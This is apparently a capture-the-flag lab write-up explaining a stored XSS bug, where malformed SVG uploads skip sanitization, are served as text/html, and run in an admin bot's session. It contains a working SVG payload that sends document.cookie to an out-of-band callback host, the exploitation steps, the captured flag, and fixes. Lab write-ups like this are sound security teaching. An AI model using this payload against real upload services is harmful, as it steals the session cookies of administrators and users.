# DryClean Pwnbox Lab - unreadable SVG upload XSS

Date: 2026-07-09
Target type: CTF/lab
Bug class: Stored XSS, unsafe file upload handling, admin bot abuse

## Observation

Lab at `https://6e994271231d.pwnbox-lab.com/`.

Hints:

- garments are stripped, pressed, hung
- ones we can't read, we leave alone
- admin walks the rack at close

Endpoints:

- `POST /api/upload` — accepts `image/*`, max 100 kb, max 10 items
- `GET /api/items` — list rack
- `POST /api/send` — admin bot visits uploaded item by `hash`

## Hypothesis

Readable SVG/XML is sanitized. If upload parsing fails ("can't read"), the file may be stored raw and served with a browser-executable content type.

## Evidence

### Readable SVG is sanitized

Normal SVG with `<script>` stored as empty shell:

```xml
<svg xmlns="http://www.w3.org/2000/svg"></svg>
```

### Unreadable SVG is left alone

Malformed / unclosed SVG:

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('https://<oast>/?c='+encodeURIComponent(document.cookie))</script>
```

Observed after upload:

- body preserved with `<script>` intact
- served as `Content-Type: text/html`
- public URL: `/items/<hash>.svg`

### Polyglot PNG behavior (secondary)

PNG magic bytes + trailing HTML:

- upload accepted with error text only when magic bytes missing
- stored raw as `image/png`
- does not execute on direct navigation in Chrome image viewer

## Test

1. Create OAST session via L30 Tools API for exfiltration.
2. Upload malformed SVG with cookie-stealing `fetch()` to OAST.
3. Confirm stored object is `text/html` and still contains script.
4. `POST /api/send` with returned `hash`.
5. Poll `GET /oast/interactions?session_id=...`.

## Result

Admin bot callback captured in OAST:

```text
GET /?c=FLAG%3Dpwnbox%7B6b41e2c937a8d50f9c3e1d6a78f4b209%7D
Origin: https://6e994271231d.pwnbox-lab.com
```

## Conclusion

Confirmed stored XSS via malformed SVG upload. Parser failure bypassed sanitization; server served attacker-controlled active content as `text/html` from a `.svg` URL. Admin review bot executed the script and exfiltrated the flag cookie via OAST.

## Root cause

- Upload path distinguishes readable vs unreadable inputs
- unreadable SVG is stored without sanitization
- serving broken SVG as `text/html` enables script execution
- admin bot opens uploaded item URLs directly in privileged session

## Flag

`pwnbox{6b41e2c937a8d50f9c3e1d6a78f4b209}`

## Fix

- Reject malformed SVG/XML instead of storing raw bytes
- Never serve upload content as `text/html` unless explicitly intended
- Sanitize or rasterize all SVG regardless of parser success
- Serve user uploads from isolated origin without app cookies
- Mark sensitive cookies `HttpOnly`
